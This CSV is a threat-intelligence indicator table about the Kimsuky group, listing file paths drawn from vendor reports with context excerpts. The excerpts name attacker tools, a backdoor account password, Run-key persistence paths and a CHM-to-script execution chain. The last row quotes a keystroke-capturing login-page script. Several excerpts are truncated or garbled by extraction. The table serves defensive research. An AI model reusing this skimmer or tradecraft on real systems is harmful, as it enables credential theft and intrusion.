schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:80fb2524b41cfd7e79e900b01f15bfa3979c8ef4d8a04ad1e026beddd3a57879,observation--sha256:c9f62f7e6a669e83dde77312700d6e6b5745f72707befa2fa9651bdeeef267d7,file-path,C:\Users\Administrator\Downloads\result.txt.lnk,C:\Users\Administrator\Downloads\result.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e3dbc74347ce66b1f04aa66adc8e6ef0f96c2541229e494cca3d1878913f7338,observation--sha256:6c504a8a77441dcfcec6afa6571b002dbeb6cbd5543fb6f951a49e54d1932598,file-path,C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로,C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 33}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○추가로, 해당유형의CHM공격C2서버에서“nhgames.zip” 라는이름의ZIP파일로위장한실행파일이배포된정황을확인했습니다. ○해당파일에대한분석을진행했지만, 의심스러운악성행위는발견되지않았으며, 공격자가제작중인테스트파일로추정하고있습니다. 또한, 공격자가“DarkHorse” 라는사용자이름을사용하는사실을확인할수있었고이번보고서의OperationName 으로명명하게됐습니다. PDB C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로 [그림4-6] nhgames.zip파일 Genians SecurityCenter 32",
1.0.0,actor--kimsuky,artifact--sha256:148419e95373c2614610ade71f9bce8f896f715c64f56013e91157ed9ec930e9,observation--sha256:25d9f8c783135c5269262d343d0c2e611a62564d42f3a506328433beadf18b0b,file-path,C:\Users\DefaultUser\Downloads\3\RdpScan_L  a_1226.exe,C:\Users\DefaultUser\Downloads\3\RdpScan_L a_1226.exe,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b47f4318414a40a2b6d1d2dd1315b988f46a46174682a8efcf9bab26445110fb,observation--sha256:4aa080df0c1f62c2931e35e9ab911db56fc89b96e1af72ed8e7a75427ec4786c,file-path,C:\Users\DefaultUser\Downloads\4\RdpScanM  ain_La_1226.exe,C:\Users\DefaultUser\Downloads\4\RdpScanM ain_La_1226.exe,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:db3785df13d1bfdb37c08907dcf39496eccf25c04f78454b5fbeb596bfcafa82,observation--sha256:80bbc6cc5f25e6949f5e5e26eae949794b90f03baf52409aaf9ebec99e3f6b19,file-path,C:\Users\DefaultUser\Downloads\KPortScan3.0,C:\Users\DefaultUser\Downloads\KPortScan3.0,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:80501c53fdbb985e9d025f078f7a7825cf4203c25432d0bca600dc0dbde89c7a,observation--sha256:d5a9727110b086a5696a75c53f4b3e29b2796dd56cf55c0735741506ef13d270,file-path,C:\Users\DefaultUser\Downloads\RdpAttack_LA,C:\Users\DefaultUser\Downloads\RdpAttack_LA,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:40002823bdc0d196f72d3b1b38f2409492f3d4485d4c61b19c30fcf323cbb163,observation--sha256:d5f2fd135f23c0c0e15c7a01c2382820129fa61b31cd09fb3d3d02293a770268,file-path,C:\Users\DefaultUser\Downloads\data\ms_x64.dll,C:\Users\DefaultUser\Downloads\data\ms_x64.dll,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0a8c3a094f46d3dc40a4af3c522ddb6236dd41bf7026bbf521ed4b946d2734c2,observation--sha256:d7bf5750bd1a07363903ba5cc6d51893be062f28fbfc080acdd5d457c5592745,file-path,C:\Users\DefaultUser\Downloads\info_sc_org1  -,C:\Users\DefaultUser\Downloads\info_sc_org1 -,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d678d81dea3b795de155c10665c2bdb4458e6eb799c62023d61ef7d5e9a70107,observation--sha256:e9fe086866c75d85262d973b06d6207e3dac43b289cc9ddcc723757a86de58b8,file-path,C:\Users\DefaultUser\Downloads\info_sc_org1.txt,C:\Users\DefaultUser\Downloads\info_sc_org1.txt,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7405b98da63de66fa3f5d10b06f61f7d84fcf88fd5ac273aabc662a3656bb598,observation--sha256:d8bc64bdda3f1efacf381246b34d40e8f58ff51ed7884c7ba45c7d5ae59e1f78,file-path,C:\Users\DefaultUser\Downloads\ms_x64.dll,C:\Users\DefaultUser\Downloads\ms_x64.dll,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:dbccfd0dadfc6c7004233c721acbbd10c72bec8637c7e0f6763f1ebc07cf5529,observation--sha256:3137b9839727f4d6d5f4dae88d5e51284aa1a45a491c65c522d620a380feea81,file-path,C:\Users\Public\Libraries\Docs.jse,C:\Users\Public\Libraries\Docs.jse,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:a899d92bafc7d11e1b23df9c8f655301c17dd33f185bade9a3531d123507d4d1,observation--sha256:fd1d2fadc72cf5be5855897c46635cef903dbd98b6df9eee42e188ba61d8c466,file-path,"C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다.","C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 11}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. sgic_info.html ○CHM파일을실행할경우, 내부에포함되어있는HTML파일이실행됩니다.이때, HTML파일의하단에존재하는악성스크립트가윈도우도움말실행프로그램인hh.exe 를통해CHM파일을“C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다. [그림3-4] HTML내부스크립트 [그림3-5] 디컴파일탐지 Genians SecurityCenter 10",
1.0.0,actor--kimsuky,artifact--sha256:c33b84ead370a4aaf58a27c68ea155bc1eee9d2774f076af1413ab765adf24e9,observation--sha256:d2d90f6020e4e647dfa059681684ffb458cb4918828ae49d0996cca70af4e731,file-path,C:\Windows\..\ProgramData\ = C:\ProgramData\,C:\Windows\..\ProgramData\ = C:\ProgramData\,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:060d3a3c5539c143b9aaf22397dcb5df3ddc29b8adff5ad2ef4171be41dcfcb4,observation--sha256:3e1a7defdaa77ed46c692a5eb60d90bbe1a04be3775bff9c8ec14a5db6bdc342,file-path,C:\Windows\SysWOW64\config\systemprofile\AppData\Roaming\winlogon.exe,C:\Windows\SysWOW64\config\systemprofile\AppData\Roaming\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f30b1130ac64a4e4290d5cc2612e638beda5c78266947ef2be8f9488ed24f9fc,observation--sha256:7b9d42bf1a5473deddadddb2f378b9623542a62881b64fcb12aaa53903b818e7,file-path,C:\Windows\System32\termsvc.dll,C:\Windows\System32\termsvc.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:63157b9731e24dd2d01482c1d107fc39ff1a29702c42bb645e53a6e4a0e87f3a,observation--sha256:acaeb71475d9a42676e80fd3f7a37a124dc3ac508b74570da27877d38ab54466,file-path,C:\Windows\system32\comhost.exe。,C:\Windows\system32\comhost.exe。,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:8e40bc37fe0d009ba1c5a18498e8b3ed135e814f99c9c0b4ce8f038d5aedbfb5,observation--sha256:fda4160b136dfe88a1a0633caf161f8d15bc3b3d9f55fd4f322ba0aa9db9e356,file-path,C:\Windows\system32\regsvr32.exe/s,C:\Windows\system32\regsvr32.exe/s,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
